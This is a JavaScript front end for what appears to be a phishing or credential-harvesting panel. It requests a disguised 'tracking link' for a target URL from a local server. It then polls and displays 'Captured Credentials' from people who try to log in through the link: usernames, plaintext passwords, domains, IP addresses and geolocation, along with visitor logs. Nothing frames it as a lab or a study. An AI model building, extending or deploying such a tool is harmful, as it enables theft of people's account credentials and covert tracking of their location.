// Function to generate tracking link
function generateLink() {
    console.log('🎯 Generate button clicked!');
    
    var originalUrl = document.getElementById("originalUrl").value.trim();
    
    if (!originalUrl) {
        showError("❌ Please enter a URL");
        return;
    }

    // Add http:// if missing
    if (!originalUrl.startsWith('http://') && !originalUrl.startsWith('https://')) {
        originalUrl = 'https://' + originalUrl;
    }

    showLoading();
    
    console.log('📤 Sending request for URL:', originalUrl);
    
    fetch('http://localhost:3000/generate', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ url: originalUrl })
    })
    .then(response => {
        console.log('📥 Response status:', response.status);
        if (!response.ok) {
            throw new Error('Server returned error: ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        console.log('✅ Success! Data:', data);
        hideLoading();
        
        document.getElementById("trackingLink").innerHTML = 
            `<div class="link-container">
                <strong>📎 Your Tracking Link:</strong> 
                <div class="tracking-url">
                    <a href="${data.trackingLink}" target="_blank">${data.trackingLink}</a>
                    <button onclick="copyToClipboard('${data.trackingLink}')" class="copy-btn">📋 Copy</button>
                </div>
                <p class="link-info">Share this link. When someone tries to login, their credentials will appear below.</p>
            </div>`;
        
        document.getElementById("trackingId").value = data.id;
        fetchLogs(data.id);
        showNotification('✅ Tracking link created successfully!');
    })
    .catch(error => {
        hideLoading();
        console.error('❌ Error:', error);
        showError('❌ Failed to generate link: ' + error.message);
    });
}

// Function to copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showNotification('✅ Link copied to clipboard!');
    });
}

// Function to fetch visit logs
function fetchLogs(id) {
    if (!id) return;
    
    fetch(`http://localhost:3000/logs/${id}`)
        .then(response => response.json())
        .then(data => {
            displayLogs(data);
        })
        .catch(error => {
            console.error('Error fetching logs:', error);
        });
}

// Function to display logs
function displayLogs(data) {
    let logsHTML = '<div class="logs-section">';
    
    // Display credentials
    if (data.credentials && data.credentials.length > 0) {
        logsHTML += '<h2>🔐 Captured Credentials</h2>';
        data.credentials.forEach((cred, index) => {
            logsHTML += `
                <div class="credential-card">
                    <div class="credential-header">
                        <strong>🎯 Login Attempt #${index + 1}</strong>
                        <span class="timestamp">${new Date(cred.timestamp).toLocaleString()}</span>
                    </div>
                    <div class="credential-details">
                        <div><strong>🌐 Domain:</strong> ${cred.credentials.domain}</div>
                        <div><strong>👤 Username:</strong> ${cred.credentials.username}</div>
                        <div><strong>🔑 Password:</strong> ${cred.credentials.password}</div>
                        <div><strong>📡 IP Address:</strong> ${cred.ip}</div>
                        <div><strong>📍 Location:</strong> ${cred.geo ? cred.geo.city + ', ' + cred.geo.country : 'Unknown'}</div>
                    </div>
                </div>
            `;
        });
    } else {
        logsHTML += '<div class="no-data">No credentials captured yet. Share your tracking link!</div>';
    }
    
    // Display visit logs
    logsHTML += '<h2>📊 Visit Logs</h2>';
    if (data.visits && data.visits.length > 0) {
        data.visits.forEach((log, index) => {
            logsHTML += `
                <div class="visit-card">
                    <div class="visit-header">
                        <strong>👁️ Visit #${index + 1}</strong>
                        <span class="timestamp">${new Date(log.timestamp).toLocaleString()}</span>
                    </div>
                    <div class="visit-details">
                        <div><strong>🌐 IP:</strong> ${log.ip}</div>
                        <div><strong>📍 Location:</strong> ${log.geo ? log.geo.city + ', ' + log.geo.country : 'Unknown'}</div>
                        <div><strong>🖥️ User Agent:</strong> ${log.userAgent}</div>
                    </div>
                </div>
            `;
        });
    } else {
        logsHTML += '<div class="no-data">No visits yet. Share your tracking link!</div>';
    }
    
    logsHTML += '</div>';
    document.getElementById("visitLogs").innerHTML = logsHTML;
}

// Function to refresh logs
function refreshLogs() {
    const trackingId = document.getElementById("trackingId").value;
    if (trackingId) {
        fetchLogs(trackingId);
        showNotification('🔄 Logs refreshed!');
    }
}

// Utility functions
function showLoading() {
    document.getElementById("loading").style.display = 'block';
}

function hideLoading() {
    document.getElementById("loading").style.display = 'none';
}

function showError(message) {
    const errorDiv = document.getElementById("errorMessage");
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 5000);
}

function showNotification(message) {
    const notification = document.getElementById("notification");
    notification.textContent = message;
    notification.style.display = 'block';
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// Enter key support
document.getElementById('originalUrl').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        generateLink();
    }
});

// Auto-refresh logs
setInterval(() => {
    const trackingId = document.getElementById("trackingId").value;
    if (trackingId) {
        fetchLogs(trackingId);
    }
}, 3000);
